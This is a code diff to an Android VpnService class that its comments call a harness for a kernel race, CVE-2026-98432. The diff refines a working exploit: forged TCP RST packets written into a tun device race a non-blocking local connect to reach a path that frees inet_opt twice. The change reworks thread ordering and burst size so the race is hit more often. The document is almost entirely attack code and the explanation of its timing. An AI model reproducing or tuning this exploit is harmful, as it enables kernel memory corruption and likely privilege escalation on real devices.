@@ -10,43 +10,44 @@ import java.net.InetAddress;
 import java.net.InetSocketAddress;
 import java.net.ServerSocket;
 import java.net.Socket;
-import java.util.concurrent.atomic.AtomicBoolean;
+import java.nio.channels.SocketChannel;
 import java.util.concurrent.atomic.AtomicLong;
 
 /**
  * Dual-path harness for CVE-2026-98432.
  *
- * The whole point is that the two halves of the race are driven through
- * different kernel paths:
+ * The two halves of the race are driven through different kernel paths:
  *
- *   CPU A -- a real socket connects to one of our own addresses. The
- *            destination is a local address, so ip_route_input() resolves
- *            RTN_LOCAL and the packet is delivered inside the connect()
- *            syscall. The ACK that reaches tcp_v4_syn_recv_sock() is
- *            therefore produced on a normal syscall path, not on the tun
- *            softirq path.
+ *   CPU A -- a socket connects to one of our own addresses. The destination is
+ *            local, so ip_route_input() resolves RTN_LOCAL and the packet is
+ *            delivered inside the connect() syscall. The ACK that reaches
+ *            tcp_v4_syn_recv_sock() is therefore produced on a normal syscall
+ *            path, not on the tun softirq path.
  *
  *   CPU B -- forged RSTs go in through the tun. tcp_check_req() drops the
  *            request sock for any RST without consulting the sequence number
- *            (verified in the shipped vmlinux), so an RST that lands while
- *            syn_recv_sock() is running makes inet_ehash_nolisten() fail,
- *            which is the path that frees inet_opt and then frees it again.
+ *            (verified in the shipped vmlinux at tcp_check_req+0x27c: the only
+ *            thing between the RST flag test and the drop is a per-cpu
+ *            counter increment), so an RST that lands while syn_recv_sock()
+ *            is running makes inet_ehash_nolisten() fail, which is the path
+ *            that frees inet_opt and then frees it again.
  *
- * Both halves used to share the single per-tun_file write queue lock, which
- * serialised them and made the race impossible. That is what this split fixes.
+ * Ordering matters and is the whole trick. Earlier versions armed a helper
+ * thread and then called a blocking connect(); by the time that helper was
+ * scheduled, the request sock was already gone and every attempt succeeded.
+ * Here the connect is non-blocking, so the SYN goes out and control returns
+ * immediately to the same thread, which starts writing RSTs right away with
+ * no scheduler hand-off in between.
  *
- * Counters tell us which case we are in:
- *   ok grows, rst stays 0 -> the RSTs are dropped before reaching the socket
- *                            (source is a local address and accept_local=0,
- *                            so martian_source kills them)
- *   rst grows             -> the RSTs reach the request socket and the race
- *                            window is actually being exercised
+ * Counters:
+ *   ok  -> handshake completed, i.e. the RSTs arrived too late
+ *   rst -> the request sock was dropped by a forged RST (race was reached)
  */
 public class MiniVpn extends VpnService implements Runnable {
 
     static final String TAG = "MiniVpn";
 
-    /** Address of the tun. This becomes a local address of the device. */
+    /** Address of the tun; becomes a local address of the device. */
     static final String IP = "10.7.7.1";
     /** Listener port. */
     static final int PORT = 47777;
@@ -55,18 +56,16 @@ public class MiniVpn extends VpnService implements Runnable {
     static final int SPORT_RANGE = 20000;
     /** Prime stride so consecutive rounds do not reuse a port too soon. */
     static final int SPORT_STRIDE = 997;
-    /** Number of RSTs fired per round, kept below the tun tx queue depth. */
-    static final int BURST = 200;
+    /** RSTs written per round. */
+    static final int BURST = 96;
+    /** Poll budget for finishConnect(), in iterations. */
+    static final int FINISH_POLLS = 400;
 
     static volatile String status = "idle";
     static final AtomicLong rounds = new AtomicLong();
     static final AtomicLong okCount = new AtomicLong();
     static final AtomicLong rstCount = new AtomicLong();
     static final AtomicLong errCount = new AtomicLong();
-
-    /** Hand-off between the client loop and the single persistent RST thread. */
-    private final AtomicBoolean armed = new AtomicBoolean(false);
-    private volatile int targetSport = 0;
 
     private ParcelFileDescriptor pfd;
     private FileOutputStream fos;
@@ -103,13 +102,6 @@ public class MiniVpn extends VpnService implements Runnable {
     public void run() {
         startListener();
         sleepQuiet(300);
-        Thread rstThread = new Thread(new Runnable() {
-            @Override
-            public void run() {
-                rstLoop();
-            }
-        }, "rst");
-        rstThread.start();
         clientLoop();
     }
 
@@ -137,65 +129,54 @@ public class MiniVpn extends VpnService implements Runnable {
         t.start();
     }
 
-    /**
-     * Single persistent writer, one burst per round, so we never create a
-     * thread per attempt.
-     */
-    private void rstLoop() {
-        while (running) {
-            if (!armed.compareAndSet(true, false)) {
-                Thread.yield();
-                continue;
-            }
-            int sport = targetSport;
-            byte[] pkt = buildRst(sport);
-            for (int k = 0; k < BURST; k++) {
-                try {
-                    fos.write(pkt);
-                } catch (Throwable t) {
-                    errCount.incrementAndGet();
-                    break;
-                }
-            }
-        }
-    }
-
     private void clientLoop() {
+        final InetAddress local = resolve(IP);
+        if (local == null) {
+            status = "bad ip";
+            return;
+        }
+        final InetSocketAddress target = new InetSocketAddress(local, PORT);
+
         int i = 0;
         while (running) {
             i++;
-
             int sport = SPORT_BASE + ((i * SPORT_STRIDE) % SPORT_RANGE);
 
-            Socket c = new Socket();
+            SocketChannel ch = null;
             try {
-                c.setReuseAddress(true);
-                c.bind(new InetSocketAddress(InetAddress.getByName(IP), sport));
-            } catch (Throwable t) {
-                errCount.incrementAndGet();
-                closeQuiet(c);
-                continue;
-            }
+                ch = SocketChannel.open();
+                ch.configureBlocking(false);
+                ch.socket().setReuseAddress(true);
+                ch.socket().bind(new InetSocketAddress(local, sport));
 
-            /*
-             * Arm before connect, not after. Creating the socket and binding it
-             * costs a few hundred microseconds, which is the same order as the
-             * whole handshake, so arming first is what lets the RST stream
-             * already be in flight when the SYN goes out.
-             */
-            targetSport = sport;
-            armed.set(true);
+                /*
+                 * Non-blocking: the SYN is emitted, control comes straight
+                 * back, and the RST stream starts on this very thread.
+                 */
+                ch.connect(target);
 
-            try {
-                c.connect(new InetSocketAddress(IP, PORT), 100);
-                okCount.incrementAndGet();
+                byte[] pkt = buildRst(sport);
+                for (int k = 0; k < BURST; k++) {
+                    try {
+                        fos.write(pkt);
+                    } catch (Throwable t) {
+                        errCount.incrementAndGet();
+                        break;
+                    }
+                }
+
+                if (awaitConnect(ch)) {
+                    okCount.incrementAndGet();
+                } else {
+                    rstCount.incrementAndGet();
+                }
             } catch (Throwable t) {
                 rstCount.incrementAndGet();
             } finally {
-                closeQuiet(c);
+                closeQuiet(ch);
             }
-            rounds.incrementAndGet();
 
+            rounds.incrementAndGet();
             if ((i % 200) == 0) {
                 Log.i(TAG, "rounds=" + rounds.get()
                         + " ok=" + okCount.get()
@@ -203,6 +184,20 @@ public class MiniVpn extends VpnService implements Runnable {
                         + " err=" + errCount.get());
             }
         }
+    }
+
+    /** Bounded busy poll: the handshake either lands within the budget or not. */
+    private boolean awaitConnect(SocketChannel ch) {
+        for (int n = 0; n < FINISH_POLLS; n++) {
+            try {
+                if (ch.finishConnect()) {
+                    return true;
+                }
+            } catch (Throwable t) {
+                return false;
+            }
+        }
+        return false;
     }
 
     private byte[] buildRst(int sport) {
@@ -236,6 +231,14 @@ public class MiniVpn extends VpnService implements Runnable {
         sum += 20;
         put16(p, 36, csum(p, 20, 20, sum));
         return p;
+    }
+
+    static InetAddress resolve(String s) {
+        try {
+            return InetAddress.getByName(s);
+        } catch (Throwable t) {
+            return null;
+        }
     }
 
     static int toInt(String s) {
